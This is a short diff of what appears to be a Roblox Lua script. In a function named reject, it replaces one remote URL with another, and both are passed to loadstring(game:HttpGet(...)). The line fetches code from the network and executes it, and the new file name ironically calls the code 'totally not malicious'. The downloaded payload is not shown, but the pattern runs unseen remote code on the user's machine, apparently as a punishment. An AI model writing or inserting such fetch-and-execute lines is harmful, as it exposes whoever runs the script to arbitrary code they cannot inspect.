@@ -3,7 +3,7 @@
 
 repeat task.wait() until game:IsLoaded()
 local function reject()
-loadstring(game:HttpGet("https://pastefy.app/pNRn1KFY/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Minh5160912/fastmax/refs/heads/main/perfectly%20normal%20code%20and%20totally%20not%20malicious"))()
 wait(100000000000)
 end
 
